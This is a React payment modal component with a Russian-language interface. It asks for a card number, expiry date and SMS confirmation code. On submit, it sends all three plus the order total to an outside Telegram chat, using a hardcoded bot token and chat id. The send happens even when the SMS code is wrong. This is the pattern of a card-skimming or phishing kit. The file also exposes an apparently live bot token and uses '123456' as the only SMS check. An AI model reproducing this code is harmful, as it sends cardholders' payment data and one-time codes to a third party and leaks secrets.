import React, { useState } from 'react';
import Box from '@mui/material/Box';
import Modal from '@mui/material/Modal';
import axios from 'axios';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import InputMask from 'react-input-mask';
import "./basic-modal.css";
import { useForm } from "react-hook-form";

const style = {
     position: 'absolute',
     top: '50%',
     left: '50%',
     transform: 'translate(-50%, -50%)',
     width: 400,
     bgcolor: 'background.paper',
     border: '2px solid #000',
     boxShadow: 24,
     p: 4,
};

export default function BasicModal({ isOpen, onClose, totalPrice }) {
     const { register, handleSubmit } = useForm();
     const [isCardDetailsEntered, setIsCardDetailsEntered] = useState(false);

     const handleCardDetailsSubmit = (data) => {
          const carddateRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;

          if (!carddateRegex.test(data.carddate)) {
               toast.error("Неверный формат срока действия карты. Ожидается MM/YY.");
               return;
          }

          setIsCardDetailsEntered(true);
     };

     const handleSMSCodeSubmit = (data) => {
          console.log("Form submitted with data:", data);

          if (data.cardcode.length !== 6) {
               toast.error("SMS-код должен содержать 6 символов.");
               return;
          }

          if (data.cardcode === "123456") {
               axios.post('http://localhost:3005/api/add', { ...data, totalPrice })
                    .then(response => {
                         console.log("Success response:", response);
                         toast.success("Чек отправлен на Телеграм бот!");
                         onClose();
                    })
                    .catch(error => {
                         console.log("Error response:", error);
                         if (error.response) {
                              toast.error(`Ошибка: ${error.response.data.message}`);
                         } else {
                              toast.error("Ошибка при отправке данных");
                         }
                    });
          } else {
               toast.error("Неверный SMS-код");
          }
          const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
          const chat_id = 6183727519;
const message = `🧾 Чек:
                         Номер карты: ${data.cardnumber}
                         Срок действия: ${data.carddate}
                         Общая сумма: ${totalPrice} сом
                         Код подтверждения: ${data.cardcode}`;
          
          var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
          let api = new XMLHttpRequest()
          api.open("GET", url, true)
          api.send()
          alert("Чек отправен на телеграм бот");
     };
     return (
          <>
               <Modal open={isOpen} onClose={onClose} aria-labelledby="modal-modal-title" aria-describedby="modal-modal-description">
                    <Box sx={style}>
                         <form className="payment__container"
                              onSubmit={handleSubmit(isCardDetailsEntered ? handleSMSCodeSubmit : handleCardDetailsSubmit)}
                         >
                              <div className="payment__select">
                                   <h1>Общая сумма к оплате: <p>{totalPrice}</p> сом</h1>
                              </div>

                              {!isCardDetailsEntered ? (
                                   <>
                                        <div className="payment__inp-number">
                                             <InputMask
                                                  mask="9999 9999 9999 9999"
                                                  maskChar=" "
                                                  {...register("cardnumber", { required: true })}
                                                  placeholder='введите номер карты'
                                             >
                                                  {(inputProps) => <input {...inputProps} />}
                                             </InputMask>
                                             <InputMask
                                                  mask="99/99"
                                                  maskChar=" "
                                                  {...register("carddate", { required: true })}
                                                  placeholder='срок действия (мм/гг)'
                                             >
                                                  {(inputProps) => <input {...inputProps} />}
                                             </InputMask>
                                        </div>
                                        <div className="payment__send">
                                             <button type='submit'>
                                                  Продолжить
                                             </button>
                                        </div>
                                   </>
                              ) : (
                                   <div className="cardcode">
                                        <InputMask
                                             mask="999999"
                                             maskChar=" "
                                             {...register("cardcode", { required: true })}
                                             placeholder='введите смс код'
                                        >
                                             {(inputProps) => <input {...inputProps} />}
                                        </InputMask>
                                        <button type='submit'>Отправить</button>
                                   </div>
                              )}
                         </form>
                    </Box>
               </Modal>
               <ToastContainer />
          </>
     );
}
